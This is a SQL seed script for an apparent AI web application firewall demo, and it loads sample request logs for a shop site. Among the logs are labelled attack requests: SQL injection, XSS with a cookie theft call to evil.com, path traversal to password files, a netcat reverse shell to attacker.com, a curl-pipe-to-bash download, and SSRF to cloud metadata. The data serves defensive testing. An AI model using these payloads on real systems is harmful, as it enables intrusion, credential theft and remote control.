-- ============================================================
-- AI-WAF Sample Data — Direct SQL Seed
-- Use this to populate PostgreSQL directly without the backend.
--
-- Run with:
--   psql postgresql://aiwaf:aiwaf_secret@localhost:5432/aiwaf -f scripts/seed.sql
-- Or inside Docker:
--   docker compose exec postgres psql -U aiwaf -d aiwaf -f /seed.sql
-- ============================================================

-- Make sure the table exists (safe to run even if already created)
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- ── Benign requests ──────────────────────────────────────────────────────────
INSERT INTO request_logs (id, ip_address, method, url, path, query_string, user_agent, status_code, response_size, request_body, threat_score, threat_level, is_malicious, attack_types, rule_score, isolation_forest_score, random_forest_score, autoencoder_score, features)
VALUES
  (gen_random_uuid(), '91.123.44.200',  'GET',    'https://shop.example.com/products?category=shoes&page=1', '/products',    'category=shoes&page=1', 'Mozilla/5.0 (Windows NT 10.0) Chrome/124.0', 200, 18420, '', 0.04, 'LOW',  false, '[]'::json, 0.00, 0.05, 0.03, 0.00, '{}'::json),
  (gen_random_uuid(), '178.23.45.12',   'GET',    'https://shop.example.com/', '/', '', 'Mozilla/5.0 (Macintosh) Safari/605.1', 200, 5200, '', 0.02, 'LOW', false, '[]'::json, 0.00, 0.03, 0.01, 0.00, '{}'::json),
  (gen_random_uuid(), '203.45.67.89',   'POST',   'https://shop.example.com/auth/login', '/auth/login', '', 'Mozilla/5.0 (iPhone) Mobile', 200, 800, 'email=user@example.com&password=hunter2', 0.06, 'LOW', false, '[]'::json, 0.00, 0.07, 0.04, 0.00, '{}'::json),
  (gen_random_uuid(), '45.67.89.10',    'GET',    'https://shop.example.com/product/42?color=blue&size=M', '/product/42', 'color=blue&size=M', 'Mozilla/5.0 Firefox/127.0', 200, 12000, '', 0.03, 'LOW', false, '[]'::json, 0.00, 0.04, 0.02, 0.00, '{}'::json),
  (gen_random_uuid(), '112.34.56.78',   'GET',    'https://shop.example.com/static/main.js', '/static/main.js', '', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 94000, '', 0.01, 'LOW', false, '[]'::json, 0.00, 0.02, 0.01, 0.00, '{}'::json),
  (gen_random_uuid(), '89.23.45.67',    'GET',    'https://shop.example.com/blog/top-10-shoes', '/blog/top-10-shoes', '', 'Mozilla/5.0 (Macintosh) Safari/605.1', 200, 22000, '', 0.02, 'LOW', false, '[]'::json, 0.00, 0.03, 0.01, 0.00, '{}'::json),
  (gen_random_uuid(), '134.56.78.90',   'POST',   'https://shop.example.com/api/cart/add', '/api/cart/add', '', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 340, '{"product_id":42,"qty":2}', 0.04, 'LOW', false, '[]'::json, 0.00, 0.05, 0.03, 0.00, '{}'::json),
  (gen_random_uuid(), '91.123.44.200',  'GET',    'https://shop.example.com/search?q=running+shoes', '/search', 'q=running+shoes', 'Mozilla/5.0 (Android) Chrome/124.0', 200, 9800, '', 0.03, 'LOW', false, '[]'::json, 0.00, 0.04, 0.02, 0.00, '{}'::json),
  (gen_random_uuid(), '178.23.45.12',   'GET',    'https://shop.example.com/robots.txt', '/robots.txt', '', 'Googlebot/2.1', 200, 120, '', 0.05, 'LOW', false, '[]'::json, 0.00, 0.06, 0.04, 0.00, '{}'::json),
  (gen_random_uuid(), '203.45.67.89',   'DELETE', 'https://shop.example.com/api/cart/item/7', '/api/cart/item/7', '', 'Mozilla/5.0 (iPhone) Mobile Safari', 204, 0, '', 0.03, 'LOW', false, '[]'::json, 0.00, 0.04, 0.02, 0.00, '{}'::json),
  (gen_random_uuid(), '45.67.89.10',    'GET',    'https://shop.example.com/checkout', '/checkout', '', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 16000, '', 0.02, 'LOW', false, '[]'::json, 0.00, 0.03, 0.01, 0.00, '{}'::json),
  (gen_random_uuid(), '112.34.56.78',   'PUT',    'https://shop.example.com/api/users/profile', '/api/users/profile', '', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 520, '{"name":"Jane Doe"}', 0.04, 'LOW', false, '[]'::json, 0.00, 0.05, 0.03, 0.00, '{}'::json),
  (gen_random_uuid(), '89.23.45.67',    'GET',    'https://shop.example.com/api/orders?page=1&limit=10', '/api/orders', 'page=1&limit=10', 'PostmanRuntime/7.39.0', 200, 3200, '', 0.05, 'LOW', false, '[]'::json, 0.00, 0.06, 0.04, 0.00, '{}'::json),
  (gen_random_uuid(), '134.56.78.90',   'GET',    'https://shop.example.com/contact', '/contact', '', 'Mozilla/5.0 (Android) Chrome/124.0', 200, 7800, '', 0.02, 'LOW', false, '[]'::json, 0.00, 0.03, 0.01, 0.00, '{}'::json),
  (gen_random_uuid(), '91.123.44.200',  'GET',    'https://shop.example.com/about', '/about', '', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 8100, '', 0.02, 'LOW', false, '[]'::json, 0.00, 0.03, 0.01, 0.00, '{}'::json),

-- ── SQL Injection ─────────────────────────────────────────────────────────────
  (gen_random_uuid(), '45.33.32.156',   'GET',    'https://shop.example.com/api/users?id=1'' OR ''1''=''1', '/api/users', 'id=1'' OR ''1''=''1', 'sqlmap/1.8.2#stable', 500, 200, '', 0.91, 'HIGH', true, '["SQL_INJECTION"]'::json, 0.95, 0.82, 0.88, 0.00, '{}'::json),
  (gen_random_uuid(), '45.33.32.156',   'GET',    'https://shop.example.com/search?q='' UNION SELECT username,password FROM users--', '/search', 'q=UNION SELECT', 'sqlmap/1.8.2#stable', 500, 0, '', 0.93, 'HIGH', true, '["SQL_INJECTION"]'::json, 0.97, 0.85, 0.90, 0.00, '{}'::json),
  (gen_random_uuid(), '198.20.69.74',   'POST',   'https://shop.example.com/auth/login', '/auth/login', '', 'python-requests/2.31.0', 403, 120, 'username=admin''--&password=x', 0.88, 'HIGH', true, '["SQL_INJECTION"]'::json, 0.90, 0.80, 0.85, 0.00, '{}'::json),
  (gen_random_uuid(), '198.20.69.74',   'GET',    'https://shop.example.com/api/products?id=1; DROP TABLE products--', '/api/products', 'id=1; DROP TABLE products--', 'curl/8.2.1', 500, 0, '', 0.92, 'HIGH', true, '["SQL_INJECTION"]'::json, 0.95, 0.83, 0.89, 0.00, '{}'::json),
  (gen_random_uuid(), '45.33.32.156',   'GET',    'https://shop.example.com/api/orders?filter=1 WAITFOR DELAY ''0:0:5''--', '/api/orders', 'filter=delay', 'sqlmap/1.8.2#stable', 500, 0, '', 0.94, 'HIGH', true, '["SQL_INJECTION"]'::json, 0.97, 0.86, 0.91, 0.00, '{}'::json),

-- ── XSS ──────────────────────────────────────────────────────────────────────
  (gen_random_uuid(), '208.85.46.21',   'GET',    'https://shop.example.com/search?q=<script>alert(document.cookie)</script>', '/search', 'q=<script>', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 4400, '', 0.84, 'HIGH', true, '["XSS"]'::json, 0.88, 0.76, 0.80, 0.00, '{}'::json),
  (gen_random_uuid(), '208.85.46.21',   'POST',   'https://shop.example.com/api/comments', '/api/comments', '', 'Mozilla/5.0 (Windows) Chrome/124.0', 403, 90, 'content=<img src=x onerror=alert(1)>', 0.82, 'HIGH', true, '["XSS"]'::json, 0.86, 0.74, 0.78, 0.00, '{}'::json),
  (gen_random_uuid(), '193.187.72.201', 'GET',    'https://shop.example.com/profile?name=<svg onload=fetch(''https://evil.com?c=''+document.cookie)>', '/profile', 'name=<svg>', 'python-requests/2.31.0', 403, 90, '', 0.86, 'HIGH', true, '["XSS"]'::json, 0.90, 0.78, 0.82, 0.00, '{}'::json),
  (gen_random_uuid(), '193.187.72.201', 'POST',   'https://shop.example.com/api/review', '/api/review', '', 'curl/8.2.1', 403, 90, 'text=javascript:alert(''XSS'')&rating=5', 0.78, 'HIGH', true, '["XSS"]'::json, 0.82, 0.70, 0.74, 0.00, '{}'::json),

-- ── Path Traversal ────────────────────────────────────────────────────────────
  (gen_random_uuid(), '185.220.101.47', 'GET',    'https://shop.example.com/api/files?name=../../../../etc/passwd', '/api/files', 'name=../../../../etc/passwd', 'Nikto/2.1.6', 403, 90, '', 0.87, 'HIGH', true, '["PATH_TRAVERSAL"]'::json, 0.91, 0.79, 0.83, 0.00, '{}'::json),
  (gen_random_uuid(), '185.220.101.47', 'GET',    'https://shop.example.com/download?path=..%2F..%2F..%2Fetc%2Fshadow', '/download', 'path=../shadow', 'Nikto/2.1.6', 403, 90, '', 0.89, 'HIGH', true, '["PATH_TRAVERSAL"]'::json, 0.93, 0.81, 0.85, 0.00, '{}'::json),
  (gen_random_uuid(), '185.220.101.47', 'GET',    'https://shop.example.com/api/read?file=../../windows/system32/win.ini', '/api/read', 'file=win.ini', 'python-requests/2.31.0', 403, 90, '', 0.85, 'HIGH', true, '["PATH_TRAVERSAL"]'::json, 0.89, 0.77, 0.81, 0.00, '{}'::json),
  (gen_random_uuid(), '45.33.32.156',   'GET',    'https://shop.example.com/view?doc=%252e%252e%252f%252e%252e%252fetc%252fhosts', '/view', 'doc=..encoded', 'curl/8.2.1', 403, 0, '', 0.83, 'HIGH', true, '["PATH_TRAVERSAL"]'::json, 0.87, 0.75, 0.79, 0.00, '{}'::json),

-- ── Command Injection ─────────────────────────────────────────────────────────
  (gen_random_uuid(), '198.20.69.74',   'GET',    'https://shop.example.com/api/ping?host=127.0.0.1; cat /etc/passwd', '/api/ping', 'host=127.0.0.1; cat', 'python-requests/2.31.0', 403, 90, '', 0.92, 'HIGH', true, '["CMD_INJECTION"]'::json, 0.95, 0.84, 0.88, 0.00, '{}'::json),
  (gen_random_uuid(), '193.187.72.201', 'POST',   'https://shop.example.com/api/process', '/api/process', '', 'curl/8.2.1', 403, 90, 'name=nginx || nc -e /bin/sh attacker.com 4444', 0.96, 'HIGH', true, '["CMD_INJECTION"]'::json, 0.99, 0.88, 0.93, 0.00, '{}'::json),
  (gen_random_uuid(), '198.20.69.74',   'GET',    'https://shop.example.com/run?arg=$(curl http://evil.com/shell.sh | bash)', '/run', 'arg=$(curl)', '', 403, 0, '', 0.93, 'HIGH', true, '["CMD_INJECTION"]'::json, 0.96, 0.85, 0.89, 0.00, '{}'::json),

-- ── SSRF ──────────────────────────────────────────────────────────────────────
  (gen_random_uuid(), '208.85.46.21',   'GET',    'https://shop.example.com/api/fetch?url=http://169.254.169.254/latest/meta-data/', '/api/fetch', 'url=169.254', 'python-requests/2.31.0', 403, 90, '', 0.86, 'HIGH', true, '["SSRF"]'::json, 0.90, 0.78, 0.82, 0.00, '{}'::json),
  (gen_random_uuid(), '185.220.101.47', 'GET',    'https://shop.example.com/api/proxy?target=http://localhost:5432/', '/api/proxy', 'target=localhost', 'curl/8.2.1', 403, 90, '', 0.84, 'HIGH', true, '["SSRF"]'::json, 0.88, 0.76, 0.80, 0.00, '{}'::json),
  (gen_random_uuid(), '193.187.72.201', 'POST',   'https://shop.example.com/webhook', '/webhook', '', 'python-requests/2.31.0', 403, 90, 'callback=file:///etc/passwd', 0.82, 'HIGH', true, '["SSRF"]'::json, 0.86, 0.74, 0.78, 0.00, '{}'::json),
  (gen_random_uuid(), '208.85.46.21',   'GET',    'https://shop.example.com/import?source=http://192.168.1.1/admin/config', '/import', 'source=192.168', 'python-requests/2.31.0', 403, 0, '', 0.79, 'HIGH', true, '["SSRF"]'::json, 0.83, 0.71, 0.75, 0.00, '{}'::json),

-- ── Medium threats (borderline) ───────────────────────────────────────────────
  (gen_random_uuid(), '112.34.56.78',   'GET',    'https://shop.example.com/search?q=SELECT * FROM', '/search', 'q=SELECT', 'Mozilla/5.0 (Windows) Chrome/124.0', 200, 4200, '', 0.62, 'MEDIUM', true, '["SQL_INJECTION"]'::json, 0.65, 0.55, 0.58, 0.00, '{}'::json),
  (gen_random_uuid(), '89.23.45.67',    'GET',    'https://shop.example.com/profile?ref=../admin', '/profile', 'ref=../admin', 'Mozilla/5.0 Firefox/127.0', 200, 3800, '', 0.58, 'MEDIUM', true, '["PATH_TRAVERSAL"]'::json, 0.61, 0.50, 0.54, 0.00, '{}'::json),
  (gen_random_uuid(), '134.56.78.90',   'POST',   'https://shop.example.com/api/feedback', '/api/feedback', '', 'python-requests/2.31.0', 200, 280, 'message=<b>hello</b><script>1</script>', 0.64, 'MEDIUM', true, '["XSS"]'::json, 0.67, 0.57, 0.60, 0.00, '{}'::json);

-- ── Alerts for HIGH threats ───────────────────────────────────────────────────
INSERT INTO alerts (id, log_id, ip_address, threat_level, threat_score, attack_types, message, acknowledged)
SELECT
  gen_random_uuid(),
  id,
  ip_address,
  threat_level,
  threat_score,
  attack_types,
  'Threat detected: ' || array_to_string(ARRAY(SELECT json_array_elements_text(attack_types)), ', ') || ' from ' || ip_address,
  false
FROM request_logs
WHERE threat_level = 'HIGH'
ORDER BY timestamp DESC;

-- ── Summary ───────────────────────────────────────────────────────────────────
SELECT
  COUNT(*) AS total_logs,
  SUM(CASE WHEN is_malicious THEN 1 ELSE 0 END) AS malicious,
  SUM(CASE WHEN threat_level = 'HIGH' THEN 1 ELSE 0 END) AS high,
  SUM(CASE WHEN threat_level = 'MEDIUM' THEN 1 ELSE 0 END) AS medium,
  SUM(CASE WHEN threat_level = 'LOW' THEN 1 ELSE 0 END) AS low,
  ROUND(AVG(threat_score)::numeric, 4) AS avg_score
FROM request_logs;
